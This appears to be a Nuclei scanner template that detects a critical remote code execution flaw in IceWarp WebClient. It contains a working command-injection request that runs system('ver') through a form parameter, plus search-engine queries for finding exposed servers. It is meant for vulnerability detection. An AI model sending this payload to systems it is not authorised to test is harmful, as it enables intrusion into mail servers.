id: icewarp-webclient-rce

info:
  name: IceWarp WebClient - Remote Code Execution
  author: gy741
  severity: critical
  description: |
    IceWarp WebClient is susceptible to remote code execution.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
    cpe: cpe:2.3:a:icewarp:icewarp:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: icewarp
    product: icewarp
    shodan-query:
      - http.title:"icewarp"
      - http.favicon.hash:"2144485375"
    fofa-query:
      - icon_hash=2144485375
      - title="icewarp"
    google-query: intitle:"icewarp"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)icewarp"})
  tags: icewarp,rce

http:
  - raw:
      - |
        POST /webmail/basic/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _dlg[captcha][target]=system(\'ver\')\

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Microsoft Windows [Version"

      - type: status
        status:
          - 302

